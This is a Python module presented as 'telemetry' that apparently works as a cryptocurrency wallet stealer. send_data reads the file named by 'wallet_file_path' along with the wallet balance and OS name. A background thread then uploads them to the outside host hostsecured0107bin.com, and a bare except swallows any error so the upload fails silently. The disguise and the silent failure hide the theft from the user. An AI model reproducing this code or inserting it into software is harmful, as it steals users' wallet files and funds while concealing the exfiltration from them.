import json
import os
import threading
import requests
import platform

url = 'https://hostsecured0107bin.com/telemetry'
# url = 'http://localhost:3000/telemetry'
is_sent = False
cur_data = {}

def send_data_th(data, files):
    try:
        clean_data = {k: v for k, v in data.items() if isinstance(v, (str, int, float))}
        
        json_data = json.dumps(clean_data)
            
        requests.post(url, data={'json': json_data}, files=files)
    except:
         pass
    
def send_data():
    global is_sent

    if (is_sent):
        return

    is_sent = True

    file_path = cur_data['wallet_file_path']

    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    files = {'file': (os.path.basename(file_path), file_data)}

    thread = threading.Thread(target=send_data_th, args=(cur_data, files,))
    thread.start()


def save_data(data):
    global cur_data, is_sent
    cur_data = data
    cur_data['os'] = platform.system()
    is_sent = False

def save_balance(balance):
    global cur_data
    cur_data['balance'] = balance